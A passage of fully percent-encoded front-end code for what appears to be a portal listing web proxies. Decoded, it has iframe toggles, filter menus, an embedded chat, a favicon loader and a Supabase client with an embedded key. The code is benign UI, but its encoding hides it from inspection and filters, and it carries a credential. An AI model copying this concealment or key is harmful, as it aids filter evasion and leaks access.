B%0A%0A%20%20%20%20%6C%65%74%20%68%69%64%64%65%6E%20%3D%20%66%61%6C%73%65%3B%0A%0A%20%20%20%20%2F%2F%20%4F%6E%6C%79%20%73%68%6F%77%20%62%75%74%74%6F%6E%20%69%66%20%74%68%65%72%65%20%61%72%65%20%69%66%72%61%6D%65%73%0A%20%20%20%20%69%66%20%28%69%66%72%61%6D%65%73%2E%6C%65%6E%67%74%68%20%3E%20%30%29%20%7B%0A%20%20%20%20%20%20%62%74%6E%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%20%22%66%6C%65%78%22%3B%0A%20%20%20%20%7D%20%65%6C%73%65%20%7B%0A%20%20%20%20%20%20%62%74%6E%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%20%22%6E%6F%6E%65%22%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%62%74%6E%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%63%6C%69%63%6B%22%2C%20%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%68%69%64%64%65%6E%20%3D%20%21%68%69%64%64%65%6E%3B%0A%0A%20%20%20%20%20%20%69%66%72%61%6D%65%73%2E%66%6F%72%45%61%63%68%28%69%66%72%61%6D%65%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%69%66%72%61%6D%65%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%20%68%69%64%64%65%6E%20%3F%20%22%6E%6F%6E%65%22%20%3A%20%22%62%6C%6F%63%6B%22%3B%0A%20%20%20%20%20%20%7D%29%3B%0A%0A%20%20%20%20%20%20%2F%2F%20%54%6F%67%67%6C%65%20%65%79%65%20%69%63%6F%6E%73%0A%20%20%20%20%20%20%65%79%65%4F%70%65%6E%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%20%68%69%64%64%65%6E%20%3F%20%22%6E%6F%6E%65%22%20%3A%20%22%69%6E%6C%69%6E%65%22%3B%0A%20%20%20%20%20%20%65%79%65%43%6C%6F%73%65%64%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%20%68%69%64%64%65%6E%20%3F%20%22%69%6E%6C%69%6E%65%22%20%3A%20%22%6E%6F%6E%65%22%3B%0A%20%20%20%20%7D%29%3B%0A%20%20%7D%29%28%29%3B%0A%3C%2F%73%63%72%69%70%74%3E%0A%0A%3C%64%69%76%20%69%64%3D%22%77%69%6B%69%4D%6F%64%61%6C%22%20%63%6C%61%73%73%3D%22%66%69%78%65%64%20%69%6E%73%65%74%2D%30%20%7A%2D%5B%31%32%30%30%5D%20%68%69%64%64%65%6E%20%69%74%65%6D%73%2D%63%65%6E%74%65%72%20%6A%75%73%74%69%66%79%2D%63%65%6E%74%65%72%22%3E%0A%20%20%3C%64%69%76%20%69%64%3D%22%77%69%6B%69%4F%76%65%72%6C%61%79%22%20%63%6C%61%73%73%3D%22%61%62%73%6F%6C%75%74%65%20%69%6E%73%65%74%2D%30%20%62%67%2D%62%6C%61%63%6B%2F%34%30%20%62%61%63%6B%64%72%6F%70%2D%62%6C%75%72%2D%73%6D%22%3E%3C%2F%64%69%76%3E%0A%20%20%3C%64%69%76%20%69%64%3D%22%77%69%6B%69%42%6F%78%22%20%63%6C%61%73%73%3D%22%72%65%6C%61%74%69%76%65%20%62%67%2D%77%68%69%74%65%20%72%6F%75%6E%64%65%64%2D%32%78%6C%20%73%68%61%64%6F%77%2D%32%78%6C%20%77%2D%5B%39%30%25%5D%20%6D%61%78%2D%77%2D%78%6C%20%70%2D%36%20%74%72%61%6E%73%66%6F%72%6D%20%73%63%61%6C%65%2D%39%35%20%6F%70%61%63%69%74%79%2D%30%20%74%72%61%6E%73%69%74%69%6F%6E%2D%61%6C%6C%20%64%75%72%61%74%69%6F%6E%2D%33%30%30%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%6A%75%73%74%69%66%79%2D%62%65%74%77%65%65%6E%20%69%74%65%6D%73%2D%63%65%6E%74%65%72%20%62%6F%72%64%65%72%2D%62%20%70%62%2D%33%20%6D%62%2D%34%22%3E%0A%20%20%20%20%20%20%3C%68%32%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%6C%67%20%66%6F%6E%74%2D%73%65%6D%69%62%6F%6C%64%20%74%65%78%74%2D%67%72%61%79%2D%38%30%30%22%3E%3C%10%20%57%65%62%20%50%72%6F%78%79%28%73%29%20%3C%10%3C%2F%68%32%3E%0A%20%20%20%20%20%20%3C%62%75%74%74%6F%6E%20%69%64%3D%22%63%6C%6F%73%65%57%69%6B%69%22%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%67%72%61%79%2D%35%30%30%20%68%6F%76%65%72%3A%74%65%78%74%2D%67%72%61%79%2D%37%30%30%20%74%65%78%74%2D%78%6C%22%3E%26%74%69%6D%65%73%3B%3C%2F%62%75%74%74%6F%6E%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%66%6C%65%78%2D%63%6F%6C%20%6D%64%3A%66%6C%65%78%2D%72%6F%77%20%67%61%70%2D%34%20%69%74%65%6D%73%2D%63%65%6E%74%65%72%20%6A%75%73%74%69%66%79%2D%62%65%74%77%65%65%6E%20%6D%62%2D%34%22%3E%0A%20%20%20%20%20%20%3C%6C%61%62%65%6C%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%66%6C%65%78%2D%63%6F%6C%20%77%2D%66%75%6C%6C%20%6D%64%3A%77%2D%31%2F%32%22%3E%0A%20%20%20%20%20%20%20%20%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%73%6D%20%66%6F%6E%74%2D%73%65%6D%69%62%6F%6C%64%20%6D%62%2D%31%22%3E%46%69%6C%74%65%72%20%62%79%20%4E%61%6D%65%3C%2F%73%70%61%6E%3E%0A%20%20%20%20%20%20%20%20%3C%73%65%6C%65%63%74%20%69%64%3D%22%66%69%6C%74%65%72%2D%6E%61%6D%65%22%20%63%6C%61%73%73%3D%22%72%6F%75%6E%64%65%64%20%62%6F%72%64%65%72%2D%67%72%61%79%2D%33%30%30%20%70%2D%32%20%66%6F%63%75%73%3A%72%69%6E%67%2D%62%6C%75%65%2D%35%30%30%22%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%6F%70%74%69%6F%6E%20%76%61%6C%75%65%3D%22%22%3E%41%6C%6C%3C%2F%6F%70%74%69%6F%6E%3E%0A%20%20%20%20%20%20%20%20%3C%2F%73%65%6C%65%63%74%3E%0A%20%20%20%20%20%20%3C%2F%6C%61%62%65%6C%3E%0A%20%20%20%20%20%20%3C%6C%61%62%65%6C%20%63%6C%61%73%73%3D%22%66%6C%65%78%20%66%6C%65%78%2D%63%6F%6C%20%77%2D%66%75%6C%6C%20%6D%64%3A%77%2D%31%2F%32%22%3E%0A%20%20%20%20%20%20%20%20%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%73%6D%20%66%6F%6E%74%2D%73%65%6D%69%62%6F%6C%64%20%6D%62%2D%31%22%3E%46%69%6C%74%65%72%20%62%79%20%44%61%74%65%3C%2F%73%70%61%6E%3E%0A%20%20%20%20%20%20%20%20%3C%73%65%6C%65%63%74%20%69%64%3D%22%66%69%6C%74%65%72%2D%64%61%74%65%22%20%63%6C%61%73%73%3D%22%72%6F%75%6E%64%65%64%20%62%6F%72%64%65%72%2D%67%72%61%79%2D%33%30%30%20%70%2D%32%20%66%6F%63%75%73%3A%72%69%6E%67%2D%62%6C%75%65%2D%35%30%30%22%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%6F%70%74%69%6F%6E%20%76%61%6C%75%65%3D%22%74%6F%64%61%79%22%3E%54%6F%64%61%79%3C%2F%6F%70%74%69%6F%6E%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%6F%70%74%69%6F%6E%20%76%61%6C%75%65%3D%22%79%65%73%74%65%72%64%61%79%22%3E%59%65%73%74%65%72%64%61%79%3C%2F%6F%70%74%69%6F%6E%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%6F%70%74%69%6F%6E%20%76%61%6C%75%65%3D%22%6C%61%73%74%37%22%3E%4C%61%73%74%20%37%20%44%61%79%73%3C%2F%6F%70%74%69%6F%6E%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%6F%70%74%69%6F%6E%20%76%61%6C%75%65%3D%22%74%68%69%73%4D%6F%6E%74%68%22%3E%54%68%69%73%20%4D%6F%6E%74%68%3C%2F%6F%70%74%69%6F%6E%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%6F%70%74%69%6F%6E%20%76%61%6C%75%65%3D%22%6C%61%73%74%4D%6F%6E%74%68%22%3E%4C%61%73%74%20%4D%6F%6E%74%68%3C%2F%6F%70%74%69%6F%6E%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%6F%70%74%69%6F%6E%20%76%61%6C%75%65%3D%22%74%68%69%73%59%65%61%72%22%3E%54%68%69%73%20%59%65%61%72%3C%2F%6F%70%74%69%6F%6E%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%6F%70%74%69%6F%6E%20%76%61%6C%75%65%3D%22%61%6C%6C%22%20%73%65%6C%65%63%74%65%64%3E%41%6C%6C%20%54%69%6D%65%3C%2F%6F%70%74%69%6F%6E%3E%0A%20%20%20%20%20%20%20%20%3C%2F%73%65%6C%65%63%74%3E%0A%20%20%20%20%20%20%3C%2F%6C%61%62%65%6C%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%69%64%3D%22%72%65%73%75%6C%74%73%22%20%63%6C%61%73%73%3D%22%73%70%61%63%65%2D%79%2D%33%20%6D%61%78%2D%68%2D%5B%35%30%76%68%5D%20%6F%76%65%72%66%6C%6F%77%2D%79%2D%61%75%74%6F%22%3E%3C%2F%64%69%76%3E%0A%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E%0A%0A%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%63%64%6E%2E%6A%73%64%65%6C%69%76%72%2E%6E%65%74%2F%6E%70%6D%2F%40%73%75%70%61%62%61%73%65%2F%73%75%70%61%62%61%73%65%2D%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E%0A%3C%73%63%72%69%70%74%3E%0A%63%6F%6E%73%74%20%65%6E%72%6F%6C%6C%65%64%42%74%6E%3D%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%65%6E%72%6F%6C%6C%65%64%42%74%6E%22%29%3B%0A%63%6F%6E%73%74%20%65%6E%72%6F%6C%6C%65%64%4C%69%73%74%3D%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%65%6E%72%6F%6C%6C%65%64%4C%69%73%74%22%29%3B%0A%63%6F%6E%73%74%20%65%6E%72%6F%6C%6C%65%64%43%68%65%76%72%6F%6E%3D%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%65%6E%72%6F%6C%6C%65%64%43%68%65%76%72%6F%6E%22%29%3B%0A%63%6F%6E%73%74%20%69%66%72%61%6D%65%4F%76%65%72%6C%61%79%3D%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%69%66%72%61%6D%65%4F%76%65%72%6C%61%79%22%29%3B%0A%63%6F%6E%73%74%20%69%66%72%61%6D%65%45%6C%3D%69%66%72%61%6D%65%4F%76%65%72%6C%61%79%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%28%22%69%66%72%61%6D%65%22%29%3B%0A%63%6F%6E%73%74%20%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%3D%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%22%29%3B%0A%63%6F%6E%73%74%20%70%72%6F%66%69%6C%65%42%74%6E%3D%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%70%72%6F%66%69%6C%65%42%74%6E%22%29%3B%0A%63%6F%6E%73%74%20%70%72%6F%66%69%6C%65%4C%65%74%74%65%72%3D%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%70%72%6F%66%69%6C%65%4C%65%74%74%65%72%22%29%3B%0A%0A%2F%2F%20%53%65%6C%65%63%74%20%74%68%65%20%22%2B%22%20%62%75%74%74%6F%6E%20%61%74%20%74%68%65%20%74%6F%70%0A%63%6F%6E%73%74%20%63%72%65%61%74%65%42%74%6E%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%28%27%62%75%74%74%6F%6E%5B%61%72%69%61%2D%6C%61%62%65%6C%3D%22%43%72%65%61%74%65%22%5D%27%29%3B%0A%0A%2F%2F%20%54%6F%67%67%6C%65%20%4D%69%6E%6E%69%74%20%63%68%61%74%20%69%66%72%61%6D%65%0A%66%75%6E%63%74%69%6F%6E%20%74%6F%67%67%6C%65%4D%69%6E%6E%69%74%49%66%72%61%6D%65%28%29%20%7B%0A%20%20%69%66%20%28%69%66%72%61%6D%65%4F%76%65%72%6C%61%79%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%3D%3D%20%22%62%6C%6F%63%6B%22%20%26%26%20%69%66%72%61%6D%65%45%6C%2E%73%72%63%2E%69%6E%63%6C%75%64%65%73%28%22%6D%69%6E%6E%69%74%2E%63%68%61%74%22%29%29%20%7B%0A%20%20%20%20%2F%2F%20%4A%75%73%74%20%68%69%64%65%20%28%64%6F%6E%27%74%20%75%6E%6C%6F%61%64%29%0A%20%20%20%20%69%66%72%61%6D%65%4F%76%65%72%6C%61%79%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%20%22%6E%6F%6E%65%22%3B%0A%20%20%7D%20%65%6C%73%65%20%7B%0A%20%20%20%20%2F%2F%20%53%68%6F%77%20%4D%69%6E%6E%69%74%20%63%68%61%74%0A%20%20%20%20%69%66%72%61%6D%65%4F%76%65%72%6C%61%79%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%20%22%62%6C%6F%63%6B%22%3B%0A%20%20%20%20%69%66%72%61%6D%65%45%6C%2E%73%72%63%20%3D%20%22%68%74%74%70%73%3A%2F%2F%6F%72%67%61%6E%69%7A%61%74%69%6F%6E%73%2E%6D%69%6E%6E%69%74%2E%63%68%61%74%2F%38%37%38%35%34%37%34%36%32%38%36%34%39%33%38%2F%63%2F%4D%61%69%6E%3F%65%6D%62%65%64%26%74%72%61%6E%73%70%61%72%65%6E%74%22%3B%0A%20%20%20%20%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%20%22%6E%6F%6E%65%22%3B%20%2F%2F%20%68%69%64%65%20%74%68%65%20%C5%20%66%6F%72%20%74%68%69%73%20%69%66%72%61%6D%65%0A%20%20%20%20%73%65%74%45%6E%72%6F%6C%6C%65%64%28%66%61%6C%73%65%29%3B%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%22%2E%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%22%29%2E%66%6F%72%45%61%63%68%28%6C%20%3D%3E%20%6C%2E%63%6C%61%73%73%4C%69%73%74%2E%72%65%6D%6F%76%65%28%22%61%63%74%69%76%65%2D%6C%69%6E%6B%22%29%29%3B%0A%20%20%7D%0A%7D%0A%0A%2F%2F%20%41%74%74%61%63%68%20%74%6F%20%22%2B%22%0A%63%72%65%61%74%65%42%74%6E%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%63%6C%69%63%6B%22%2C%20%74%6F%67%67%6C%65%4D%69%6E%6E%69%74%49%66%72%61%6D%65%29%3B%0A%0A%20%20%0A%63%6F%6E%73%74%20%73%75%70%61%62%61%73%65%20%3D%20%77%69%6E%64%6F%77%2E%73%75%70%61%62%61%73%65%2E%63%72%65%61%74%65%43%6C%69%65%6E%74%28%0A%20%20%27%68%74%74%70%73%3A%2F%2F%79%6C%62%65%75%63%6F%6B%6B%66%6F%74%67%67%68%62%76%65%75%76%2E%73%75%70%61%62%61%73%65%2E%63%6F%27%2C%0A%20%20%27%65%79%4A%68%62%47%63%69%4F%69%4A%49%55%7A%49%31%4E%69%49%73%49%6E%52%35%63%43%49%36%49%6B%70%58%56%43%4A%39%2E%65%79%4A%70%63%33%4D%69%4F%69%4A%7A%64%58%42%68%59%6D%46%7A%5A%53%49%73%49%6E%4A%6C%5A%69%49%36%49%6E%6C%73%59%6D%56%31%59%32%39%72%61%32%5A%76%64%47%64%6E%61%47%4A%32%5A%58%56%32%49%69%77%69%63%6D%39%73%5A%53%49%36%49%6D%46%75%62%32%34%69%4C%43%4A%70%59%58%51%69%4F%6A%45%33%4E%44%51%30%4D%6A%55%35%4D%6A%6B%73%49%6D%56%34%63%43%49%36%4D%6A%41%32%4D%44%41%77%4D%54%6B%79%4F%58%30%2E%45%4D%35%32%5A%38%59%56%41%34%78%75%43%6E%4E%50%4C%72%41%75%77%65%4A%71%36%35%32%51%41%50%61%33%41%6A%78%6A%4E%52%49%72%78%45%38%27%0A%29%3B%0A%0A%63%6F%6E%73%74%20%75%73%65%72%49%64%20%3D%20%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%67%65%74%49%74%65%6D%28%27%75%73%65%72%49%64%27%29%20%7C%7C%20%28%27%75%73%65%72%5F%27%20%2B%20%4D%61%74%68%2E%72%61%6E%64%6F%6D%28%29%2E%74%6F%53%74%72%69%6E%67%28%33%36%29%2E%73%75%62%73%74%72%28%32%2C%39%29%29%3B%0A%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%73%65%74%49%74%65%6D%28%27%75%73%65%72%49%64%27%2C%20%75%73%65%72%49%64%29%3B%0A%0A%2F%2F%20%54%6F%67%67%6C%65%20%65%6E%72%6F%6C%6C%65%64%0A%66%75%6E%63%74%69%6F%6E%20%73%65%74%45%6E%72%6F%6C%6C%65%64%28%6F%70%65%6E%29%7B%0A%20%20%65%6E%72%6F%6C%6C%65%64%4C%69%73%74%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%3D%6F%70%65%6E%3F%22%66%6C%65%78%22%3A%22%6E%6F%6E%65%22%3B%0A%20%20%65%6E%72%6F%6C%6C%65%64%42%74%6E%2E%73%65%74%41%74%74%72%69%62%75%74%65%28%22%61%72%69%61%2D%65%78%70%61%6E%64%65%64%22%2C%6F%70%65%6E%29%3B%0A%20%20%65%6E%72%6F%6C%6C%65%64%43%68%65%76%72%6F%6E%2E%73%74%79%6C%65%2E%74%72%61%6E%73%66%6F%72%6D%3D%6F%70%65%6E%3F%22%72%6F%74%61%74%65%28%30%64%65%67%29%22%3A%22%72%6F%74%61%74%65%28%2D%39%30%64%65%67%29%22%3B%0A%7D%0A%65%6E%72%6F%6C%6C%65%64%42%74%6E%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%63%6C%69%63%6B%22%2C%28%29%3D%3E%7B%73%65%74%45%6E%72%6F%6C%6C%65%64%28%65%6E%72%6F%6C%6C%65%64%4C%69%73%74%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%3D%3D%3D%22%6E%6F%6E%65%22%29%3B%7D%29%3B%0A%0A%2F%2F%20%50%72%6F%66%69%6C%65%20%70%65%72%73%69%73%74%65%6E%63%65%0A%63%6F%6E%73%74%20%73%61%76%65%64%4C%65%74%74%65%72%3D%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%67%65%74%49%74%65%6D%28%22%70%72%6F%66%69%6C%65%4C%65%74%74%65%72%22%29%3B%0A%63%6F%6E%73%74%20%73%61%76%65%64%43%6F%6C%6F%72%3D%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%67%65%74%49%74%65%6D%28%22%70%72%6F%66%69%6C%65%43%6F%6C%6F%72%22%29%3B%0A%69%66%28%73%61%76%65%64%4C%65%74%74%65%72%29%20%70%72%6F%66%69%6C%65%4C%65%74%74%65%72%2E%74%65%78%74%43%6F%6E%74%65%6E%74%3D%73%61%76%65%64%4C%65%74%74%65%72%3B%0A%69%66%28%73%61%76%65%64%43%6F%6C%6F%72%29%20%70%72%6F%66%69%6C%65%42%74%6E%2E%73%74%79%6C%65%2E%62%61%63%6B%67%72%6F%75%6E%64%43%6F%6C%6F%72%3D%73%61%76%65%64%43%6F%6C%6F%72%3B%0A%0A%2F%2F%20%43%61%74%65%67%6F%72%79%20%65%78%70%61%6E%64%2F%63%6F%6C%6C%61%70%73%65%0A%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%27%2E%63%61%74%65%67%6F%72%79%2D%68%65%61%64%65%72%27%29%2E%66%6F%72%45%61%63%68%28%68%3D%3E%7B%0A%20%20%63%6F%6E%73%74%20%6C%69%73%74%3D%68%2E%6E%65%78%74%45%6C%65%6D%65%6E%74%53%69%62%6C%69%6E%67%3B%0A%20%20%63%6F%6E%73%74%20%69%63%6F%6E%3D%68%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%28%27%69%27%29%3B%0A%20%20%69%63%6F%6E%2E%73%74%79%6C%65%2E%74%72%61%6E%73%66%6F%72%6D%3D%22%72%6F%74%61%74%65%28%2D%39%30%64%65%67%29%22%3B%0A%20%20%68%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%6C%69%63%6B%27%2C%28%29%3D%3E%7B%0A%20%20%20%20%63%6F%6E%73%74%20%6F%70%65%6E%3D%6C%69%73%74%2E%63%6C%61%73%73%4C%69%73%74%2E%74%6F%67%67%6C%65%28%27%6F%70%65%6E%27%29%3B%0A%20%20%20%20%69%63%6F%6E%2E%73%74%79%6C%65%2E%74%72%61%6E%73%66%6F%72%6D%3D%6F%70%65%6E%3F%22%72%6F%74%61%74%65%28%30%64%65%67%29%22%3A%22%72%6F%74%61%74%65%28%2D%39%30%64%65%67%29%22%3B%0A%20%20%7D%29%3B%0A%7D%29%3B%0A%0A%2F%2F%20%49%66%72%61%6D%65%20%6F%70%65%6E%0A%66%75%6E%63%74%69%6F%6E%20%6F%70%65%6E%49%66%72%61%6D%65%28%6C%69%6E%6B%45%6C%2C%75%72%6C%29%7B%0A%20%20%69%66%72%61%6D%65%4F%76%65%72%6C%61%79%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%3D%22%62%6C%6F%63%6B%22%3B%0A%20%20%69%66%72%61%6D%65%45%6C%2E%73%72%63%3D%75%72%6C%3B%0A%20%20%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%3D%22%66%6C%65%78%22%3B%0A%20%20%73%65%74%45%6E%72%6F%6C%6C%65%64%28%66%61%6C%73%65%29%3B%0A%20%20%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%22%2E%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%22%29%2E%66%6F%72%45%61%63%68%28%6C%3D%3E%6C%2E%63%6C%61%73%73%4C%69%73%74%2E%72%65%6D%6F%76%65%28%22%61%63%74%69%76%65%2D%6C%69%6E%6B%22%29%29%3B%0A%20%20%6C%69%6E%6B%45%6C%2E%63%6C%61%73%73%4C%69%73%74%2E%61%64%64%28%22%61%63%74%69%76%65%2D%6C%69%6E%6B%22%29%3B%0A%7D%0A%0A%2F%2F%20%53%6D%61%72%74%20%66%61%76%69%63%6F%6E%0A%66%75%6E%63%74%69%6F%6E%20%68%61%73%68%43%6F%6C%6F%72%28%73%74%72%29%7B%6C%65%74%20%68%3D%30%3B%66%6F%72%28%6C%65%74%20%69%3D%30%3B%69%3C%73%74%72%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%68%3D%73%74%72%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2B%28%28%68%3C%3C%35%29%2D%68%29%3B%63%6F%6E%73%74%20%63%6F%6C%6F%72%73%3D%5B%22%23%66%66%64%37%30%30%22%2C%22%23%66%39%64%39%63%35%22%2C%22%23%65%30%65%30%65%30%22%2C%22%23%61%64%64%38%65%36%22%2C%22%23%63%63%65%30%66%66%22%2C%22%23%66%66%63%63%65%30%22%2C%22%23%64%32%65%33%66%63%22%5D%3B%72%65%74%75%72%6E%20%63%6F%6C%6F%72%73%5B%4D%61%74%68%2E%61%62%73%28%68%29%25%63%6F%6C%6F%72%73%2E%6C%65%6E%67%74%68%5D%3B%7D%0A%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%20%73%6D%61%72%74%46%61%76%69%63%6F%6E%28%75%72%6C%2C%6C%69%6E%6B%29%7B%0A%20%20%6C%65%74%20%64%6F%6D%61%69%6E%3B%0A%20%20%74%72%79%7B%64%6F%6D%61%69%6E%3D%6E%65%77%20%55%52%4C%28%75%72%6C%29%2E%6F%72%69%67%69%6E%3B%7D%63%61%74%63%68%7B%20%72%65%74%75%72%6E%3B%7D%0A%20%20%63%6F%6E%73%74%20%69%6D%67%3D%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%22%69%6D%67%22%29%3B%0A%20%20%69%6D%67%2E%63%6C%61%73%73%4E%61%6D%65%3D%22%66%61%76%69%63%6F%6E%2D%69%6D%67%22%3B%0A%20%20%69%6D%67%2E%61%6C%74%3D%22%66%61%76%69%63%6F%6E%22%3B%0A%20%20%63%6F%6E%73%74%20%74%72%79%53%6F%75%72%63%65%73%3D%5B%60%68%74%74%70%73%3A%2F%2F%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D%2F%73%32%2F%66%61%76%69%63%6F%6E%73%3F%64%6F%6D%61%69%6E%3D%24%7B%64%6F%6D%61%69%6E%7D%26%73%7A%3D%33%32%60%2C%20%60%24%7B%64%6F%6D%61%69%6E%7D%2F%66%61%76%69%63%6F%6E%2E%69%63%6F%60%5D%3B%0A%20%20%74%72%79%20%7B%0A%20%20%20%20%63%6F%6E%73%74%20%72%65%73%70%3D%61%77%61%69%74%20%66%65%74%63%68%28%75%72%6C%2C%7B%6D%6F%64%65%3A%22%63%6F%72%73%22%7D%29%3B%0A%20%20%20%20%63%6F%6E%73%74%20%68%74%6D%6C%3D%61%77%61%69%74%20%72%65%73%70%2E%74%65%78%74%28%29%3B%0A%20%20%20%20%63%6F%6E%73%74%20%70%61%72%73%65%72%3D%6E%65%77%20%44%4F%4D%50%61%72%73%65%72%28%29%3B%0A%20%20%20%20%63%6F%6E%73%74%20%64%6F%63%3D%70%61%72%73%65%72%2E%70%61%72%73%65%46%72%6F%6D%53%74%72%69%6E%67%28%68%74%6D%6C%2C%22%74%65%78%74%2F%68%74%6D%6C%22%29%3B%0A%20%20%20%20%63%6F%6E%73%74%20%69%63%6F%6E%73%3D%5B%2E%2E%2E%64%6F%63%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%22%6C%69%6E%6B%5B%72%65%6C%2A%3D%27%69%63%6F%6E%27%5D%22%29%5D%3B%0A%20%20%20%20%69%66%28%69%63%6F%6E%73%2E%6C%65%6E%67%74%68%29%7B%0A%20%20%20%20%20%20%63%6F%6E%73%74%20%68%72%65%66%3D%69%63%6F%6E%73%5B%30%5D%2E%67%65%74%41%74%74%72%69%62%75%74%65%28%22%68%72%65%66%22%29%3B%0A%20%20%20%20%20%20%69%66%28%68%72%65%66%29%7B%63%6F%6E%73%74%20%61%62%73%3D%6E%65%77%20%55%52%4C%28%68%72%65%66%2C%64%6F%6D%61%69%6E%29%2E%68%72%65%66%3B%74%72%79%53%6F%75%72%63%65%73%2E%75%6E%73%68%69%66%74%28%61%62%73%29%3B%7D%0A%20%20%20%20%7D%0A%20%20%7D%20%63%61%74%63%68%28%65%29%7B%7D%0A%20%20%6C%65%74%20%69%3D%30%3B%0A%20%20%66%75%6E%63%74%69%6F%6E%20%74%72%79%4E%65%78%74%28%29%7B%0A%20%20%20%20%69%66%28%69%3E%3D%74%72%79%53%6F%75%72%63%65%73%2E%6C%65%6E%67%74%68%29%7B%0A%20%20%20%20%20%20%63%6F%6E%73%74%20%66%61%6C%6C%62%61%63%6B%3D%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%22%73%70%61%6E%22%29%3B%0A%20%20%20%20%20%20%66%61%6C%6C%62%61%63%6B%2E%74%65%78%74%43%6F%6E%74%65%6E%74%3D%6E%65%77%20%55%52%4C%28%75%72%6C%29%2E%68%6F%73%74%6E%61%6D%65%2E%63%68%61%72%41%74%28%30%29%2E%74%6F%55%70%70%65%72%43%61%73%65%28%29%3B%0A%20%20%20%20%20%20%66%61%6C%6C%62%61%63%6B%2E%63%6C%61%73%73%4E%61%6D%65%3D%22%66%61%76%69%63%6F%6E%2D%6C%65%74%74%65%72%22%3B%0A%20%20%20%20%20%20%66%61%6C%6C%62%61%63%6B%2E%73%74%79%6C%65%2E%62%61%63%6B%67%72%6F%75%6E%64%43%6F%6C%6F%72%3D%68%61%73%68%43%6F%6C%6F%72%28%75%72%6C%29%3B%0A%20%20%20%20%20%20%6C%69%6E%6B%2E%71%75%65%72%79%53%65%6C%65%6